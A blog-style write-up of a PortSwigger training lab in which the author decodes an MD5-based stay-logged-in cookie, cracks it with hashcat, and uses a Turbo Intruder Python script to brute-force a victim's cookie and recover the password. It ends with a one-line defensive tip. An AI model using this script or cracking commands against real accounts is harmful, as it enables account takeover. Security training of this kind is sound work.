---
layout: post
title: "PortSwigger Lab: Brute-forcing a stay-logged-in cookie"
date: 2026-02-02
categories:
  [
    "PortSwigger",
    "Practice",
    "Authentication Vulnerabilities",
    "Vulnerabilities in other authentication mechanisms",
  ]
tags:
  - "PortSwigger"
  - "Authentication Vulnerabilities"
  - "Vulnerabilities in other authentication mechanisms"
  - "Stay Logged In"
  - "Cookies"
  - "Brute Force"
  - "Turbo Intruder"
  - "Burp Suite"
---

# PortSwigger Lab: Brute-forcing a stay-logged-in cookie

# Table of Contents

- [Overview / Goal](#overview--goal)
- [Lab Setup and Tools](#lab-setup-and-tools)
- [Solution Steps](#solution-steps)
- [What I'd Do Next (Blue Team)](#what-id-do-next)
- [Try This Lab Yourself](#try-this-lab-yourself)

---

# Overview / Goal {#overview--goal}

> "This lab allows users to stay logged in even after they close their browser session. The cookie used to provide this functionality is vulnerable to brute-forcing."
>
> "To solve the lab, brute-force Carlos's cookie to gain access to his **My account** page."

> - Your credentials: `wiener:peter`
> - Victim's username: `carlos`
> - [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)

Alright, based on the info given I can tell that the goal of this lab is to figure out the vulnerability in the cookie by logging in with my creds, then brute forcing Carlos's login.

# Lab Setup and Tools {#lab-setup-and-tools}

- Burp Suite + Firefox (through FoxyProxy)
- Turbo Intruder extension
- Hashcat

---

# Solution Steps {#solution-steps}

**1) Analysing the Stay-Logged-In Cookie**

I first thought I'd try logging in **without** enabling "Stay logged in" and nothing grabbed my attention.

Then I logged in again with **Stay logged in** enabled.

This time, a new cookie appeared:

```http
stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
```

I sent this value to the **Burp Decoder** and Base64-decoded it:

```plaintext
wiener:51dc30ddc473d43a6011e9ebba6ca770
```

So the cookie format is:

```plaintext
username:hash
```

The hash looked like possibly MD5?

To confirm, I cracked it with hashcat:

```bash
echo 51dc30ddc473d43a6011e9ebba6ca770 > hash.txt
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

Result:

```bash
51dc30ddc473d43a6011e9ebba6ca770:peter
```

From here I can tell how the `stay-logged-in` stores logins 😈.
I can use that logic to apply to others. specifically my victim Carlos if he happens to use the "Stay logged in" feature.

**2) Brute-Forcing Carlos's Cookie**

So now, I need to use my beloved Turbo Intruder extension to make a script that brute forces Carlos's account.

Here is the flow:

1. Take a candidate password from the wordlist
2. MD5 hash it
3. Build the string `carlos:<md5>`
4. Base64 encode that whole string
5. Send it as the cookie value
6. repeat for all passwords in wordlist

I took my request and modified it like this:

```http
GET /my-account?id=carlos HTTP/2
Host: 0ae8001403550fdd803dbcc900b50036.web-security-academy.net
Cookie: session=; stay-logged-in=%s
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Referer: https://0ae8001403550fdd803dbcc900b50036.web-security-academy.net/login
Te: trailers
```

Changes made:

- `id=wiener` -> `id=carlos`
- Removed the session cookie so it generates a new one
- Replaced `stay-logged-in` value with `%s` for Turbo Intruder

Then I whipped up this Turbo Intruder script:

```python
import hashlib
import base64

def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        engine=Engine.BURP2
    )
    for password in open('/home/kali/pw'):
        password = password.rstrip()
        md5 = hashlib.md5(password).hexdigest()
        combo = "carlos:%s" % md5
        b64 = base64.b64encode(combo)
        engine.queue(target.req, b64)
def handleResponse(req, interesting):
    if req.status != 404:
        table.add(req)
```

After running the attack, one request worked.

The account page loaded, and the lab was solved!

**Bonus: Recovering the Password**

Out of curiosity, I wanted to know Carlos's password. I took the cookie that worked:

```http
stay-logged-in=Y2FybG9zOjdkOGJjNWYxYThkMzc4N2QwNmVmMTFjOTdkNDY1NWRm
```

Decoded it:

```plaintext
carlos:7d8bc5f1a8d3787d06ef11c97d4655df
```

Then cracked the hash:

```bash
hashcat -m 0 -a 0 hash.txt /home/kali/pw
```

Result:

```bash
7d8bc5f1a8d3787d06ef11c97d4655df:taylor
```

Carlos's password was `taylor` ✅

---

# What I'd Do Next (Blue Team) {#what-id-do-next}

- Rely on Web Frameworks for Session Cookie Management to use a signed, server-generated token instead of encoding credentials.

---

# Try This Lab Yourself {#try-this-lab-yourself}

🔗 Lab Link: [PortSwigger Lab: Brute-forcing a stay-logged-in cookie](https://portswigger.net/web-security/learning-paths/authentication-vulnerabilities/vulnerabilities-in-other-authentication-mechanisms/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie)
